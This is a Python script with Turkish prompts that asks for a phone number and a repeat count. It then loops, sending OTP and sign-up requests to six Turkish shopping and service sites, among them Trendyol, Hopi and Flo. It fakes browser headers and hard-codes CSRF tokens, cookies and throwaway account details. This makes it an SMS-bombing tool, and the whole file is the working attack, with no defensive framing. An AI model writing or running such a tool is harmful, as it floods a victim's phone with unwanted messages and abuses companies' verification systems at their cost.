import requests


gsm = input("No Gir: ")


num_requests = int(input("Kaç kere atmak istersiniz? "))


def send_first_request(gsm):
    headers = {
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://www.englishhome.com',
        'priority': 'u=1, i',
        'referer': 'https://www.englishhome.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    data = { 
        "Phone": f"+90{gsm}"
    }

    response = requests.post('https://www.englishhome.com/api/member/sendOtp', headers=headers, json=data)
    if '"isError":false,"' in response.text:
        print("Başarılı - EnglishHome")
    elif "Sms gönderim süresi dolduktan sonra tekrar gönderim sağlayabilirsiniz" in response.text:
        print("Sms gönderim süresi dolduktan sonra tekrar Dene - EnglishHome")
    print(response.text)


def send_second_request(gsm):
    headers = {
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://www.tiklagelsin.com',
        'priority': 'u=1, i',
        'referer': 'https://www.tiklagelsin.com/a/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-device-type': '3',
        'x-merchant-type': '0',
        'x-no-auth': 'true',
    }

    json_data = {
        'operationName': 'GENERATE_OTP',
        'variables': {
            'phone': f'+90{gsm}',
            'challenge': 'bc0e2de9-de27-4c7a-be5a-52f30862635c',
            'deviceUniqueId': 'web_f94c5e5c-0bf6-4eda-9229-f0d196968cf9',
        },
        'query': '''
            mutation GENERATE_OTP($phone: String!, $challenge: String!, $deviceUniqueId: String!) {
                generateOtp(
                    phone: $phone
                    challenge: $challenge
                    deviceUniqueId: $deviceUniqueId
                )
            }
        ''',
    }

    response = requests.post('https://www.tiklagelsin.com/user/graphql', headers=headers, json=json_data)
    if 'data' in response.text:
        print("Başarılı - TiklaGelsin")
    else:
        print("Başarısız - TiklaGelsin")
    print(response.text)


def send_third_request(gsm):
    headers = {
        'accept': 'application/json',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://naosstars.com',
        'referer': 'https://naosstars.com/user/register',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-csrf-token': 'heNMaCzqbBZL7xt4qKkSHYoeDvbmF7mdjYjvFUOv',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'type': 'register',
        'first_name': 'baba',
        'last_name': 'gamer',
        'email': 'wdwdwa@gmail.com',
        'telephone': f'+90{gsm}',
        'new_password': 'L4d2scHSF.WDCE',
        'invitation_code': '',
        'permission_newsletter': '1',
        'kvkk': '1',
        'user_check': '1',
    }

    response = requests.post('https://naosstars.com/api/smsSend/22409665-a380-4fef-bc94-d50318186968', headers=headers, json=json_data)
    if response.status_code == 200:
        print("Başarıyla gönderildi! - NaosStars")
    elif response.status_code == 412:
        print("Geçici engel - NaosStars")
    else:
        print(f"Hata oluştu. Yanıt kodu: {response.status_code} - NaosStars")
        print("Yanıt içeriği:", response.text)


def send_fourth_request(gsm):
    headers = {
        'accept': 'text/x-component',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
        'content-type': 'text/plain;charset=UTF-8',
        'next-action': '00b77a994649a1dac9613aa2ae77c96bc42f0d87',
        'next-router-state-tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22hopi%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
        'origin': 'https://hopi.com.tr',
        'priority': 'u=1, i',
        'referer': 'https://hopi.com.tr/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    data = f'[{gsm}]'

    response = requests.post('https://hopi.com.tr/', headers=headers, data=data)

    
    if response.status_code == 200:
        print("Başarıyla gönderildi! - Hopi")
    elif response.status_code == 400:
        print("Geçersiz istek. Yanıt kodu: 400 - Hopi")
    elif response.status_code == 401:
        print("Yetkilendirme hatası. Yanıt kodu: 401 - Hopi")
    elif response.status_code == 403:
        print("Erişim reddedildi. Yanıt kodu: 403 - Hopi")
    elif response.status_code == 404:
        print("Sayfa bulunamadı. Yanıt kodu: 404 - Hopi")
    elif response.status_code == 500:
        print("Sunucu hatası. Yanıt kodu: 500 - Hopi")
    else:
        print(f"Beklenmeyen yanıt kodu: {response.status_code} - Hopi")
    print(response.text)




def send_sixth_request(gsm):
    headers = {
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.trendyol.com',
        'referer': 'https://www.trendyol.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    data = {
        'phone': f'0{gsm}'
    }

    response = requests.post('https://www.trendyol.com/api/v2/auth/otp', headers=headers, data=data)

    if response.status_code == 200:
        print("Başarıyla gönderildi! - Trendyol")
    else:
        print(f"Başarısız - Trendyol. Yanıt kodu: {response.status_code}")
    print(response.text)


def send_seventh_request(gsm):
    cookies = {
        'bunsar_visitor_id': 'b3f5fd60-5fe1-405b-8c45-086894c2d603',
        'get_user_id': '0e172r0oei258',
        'activeTab': '1',
        'unique_session_id': 'fb3592aa8d95f570be27029cfb36f8d8',
        'G_ENABLED_IDPS': 'google',
        'waitingTime': '0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.flo.com.tr',
        'permissions-policy': "geolocation 'self' https://www.flo.com.tr",
        'priority': 'u=1, i',
        'referer': 'https://www.flo.com.tr/customer/login',
        'referrer-policys': 'no-referrer',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-frame-options': 'SAMEORIGIN',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = f'csrf_token=a765d7584ab02d02b49d8da7e7cc71f83d27e8af&phone=0{gsm}&email=dwadwadwa%40gmail.com&password=_HSEzr2j6GRdtS7&gender=1&newsletter_email=79&newsletter_sms=67&uyelik_sozlesmesi=80&subscribed_kvkk=85'

    response = requests.post('https://www.flo.com.tr/ajax/customer/register', cookies=cookies, headers=headers, data=data)

    if response.status_code == 200:
        print("Başarıyla gönderildi! - Flo")
    else:
        print(f"Başarısız - Flo. Yanıt kodu: {response.status_code}")
    print(response.text)


for i in range(num_requests):
    print(f"\nİstek {i + 1}:")
    send_first_request(gsm)
    send_second_request(gsm)
    send_third_request(gsm)
    send_fourth_request(gsm)
    send_sixth_request(gsm)
    send_seventh_request(gsm)
    print("---------------------------------------------------------------------")
